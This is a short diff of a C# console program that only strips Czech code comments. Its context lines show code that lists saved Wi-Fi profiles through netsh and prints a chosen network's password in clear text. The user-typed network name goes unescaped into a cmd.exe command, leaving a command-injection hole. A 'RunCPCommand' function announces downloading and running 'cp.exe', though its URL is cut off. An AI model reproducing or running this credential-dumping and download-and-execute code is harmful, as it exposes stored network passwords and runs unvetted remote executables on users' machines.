@@ -81,7 +81,6 @@ class Program
     {
         Console.WriteLine("Listing all WiFi profiles...");
 
-        // Spustí příkaz pro získání všech Wi-Fi profilů
         Process process = new Process();
         process.StartInfo.FileName = "cmd.exe";
         process.StartInfo.Arguments = "/C netsh wlan show profiles";
@@ -91,7 +90,6 @@ class Program
 
         process.Start();
 
-        // Čte výstup z příkazu a vypisuje všechny Wi-Fi profily
         string output = process.StandardOutput.ReadToEnd();
 
         process.WaitForExit();
@@ -101,16 +99,13 @@ class Program
         Console.WriteLine("Enter the WiFi name (SSID) to get the password: ");
         string wifiName = Console.ReadLine();
 
-        // Spustí příkaz pro získání hesla Wi-Fi z příkazového řádku
         process.StartInfo.Arguments = $"/C netsh wlan show profile name=\"{wifiName}\" key=clear";
         process.Start();
 
-        // Čte výstup z příkazu pro heslo
         output = process.StandardOutput.ReadToEnd();
 
         process.WaitForExit();
 
-        // Hledá a vypíše heslo z výstupu
         if (output.Contains("Key Content"))
         {
             string[] lines = output.Split('\n');
@@ -162,8 +157,6 @@ class Program
     static void RunCPCommand()
     {
         Console.WriteLine("Downloading and running cp.exe...");
-
-        // Stažení a spuštění cp.exe
         try
         {
             using (var client = new WebClient())
